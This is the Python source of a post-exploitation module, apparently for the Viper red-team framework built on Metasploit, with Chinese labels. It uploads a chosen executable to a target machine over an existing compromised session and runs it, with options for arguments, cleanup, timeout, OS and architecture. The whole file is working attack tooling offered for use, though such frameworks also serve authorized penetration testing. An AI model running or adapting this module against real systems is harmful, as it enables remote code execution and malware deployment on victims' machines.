# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "上传并执行可执行文件"
    DESC = "模块会将用户指定文件上传到目标机并执行.\n"
    MODULETYPE = TAG2CH.Execution
    PLATFORM = ["Windows", "Linux"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", "Root"]  # 所需权限
    ATTCK = ["T1081"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1059/"]
    README = ["https://www.yuque.com/vipersec/module/gkm65g"]
    AUTHOR = "Viper"

    OPTIONS = register_options([
        OptionFileEnum(),
        OptionStr(name='ARGS', name_tag="命令行参数", option_length=24, desc="运行可执行文件时命令行参数"),
        OptionBool(name='CLEANUP', name_tag="是否清理可执行文件", desc="执行完成后是否删除可执行文件", default=False),
        OptionInt(name='TIMEOUT', name_tag="等待时间", desc="读取输出前等待时间", default=10),
        OptionEnum(name='OS', name_tag="OS", desc="可执行文件适配的OS(Windows/Linux/ALL),ALL或者不填写表示跳过检查", required=False,
                   default='windows',
                   enum_list=[
                       {'name': 'Windows', 'value': 'windows'},
                       {'name': 'Linux', 'value': 'linux'},
                       {'name': 'ALL', 'value': 'all'},
                   ]),
        OptionEnum(name='ARCH', name_tag="ARCH", desc="可执行文件适配的Arch(x86,x64),ALL或者不填写表示跳过检查", required=False,
                   default='x64',
                   enum_list=[
                       {'name': 'x86', 'value': 'x86'},
                       {'name': 'x64', 'value': 'x64'},
                       {'name': 'ALL', 'value': 'all'},
                   ]),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "multi/manage/upload_and_exec_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        os = self.param('OS')
        if os == "windows" and session.is_windows:
            pass
        elif os == "linux" and session.is_linux:
            pass
        elif os is None or os == "all":
            pass
        else:
            return False, "模块os参数与session的os不一致"
        arch = self.param('ARCH')

        if arch == session.arch:
            pass
        elif arch is None or arch == "all":
            pass
        else:
            return False, "模块arch参数与session的arch不一致"

        filename = self.get_fileenum_option()
        self.set_msf_option("LPATH", filename)
        self.set_msf_option("CLEANUP", self.param("CLEANUP"))
        self.set_msf_option("TIMEOUT", self.param("TIMEOUT"))
        self.set_msf_option("ARGS", self.param("ARGS"))
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败")
            self.log_error(message)
            return

        self.log_good("模块运行完成,可执行文件输出信息:")
        self.log_raw(data)
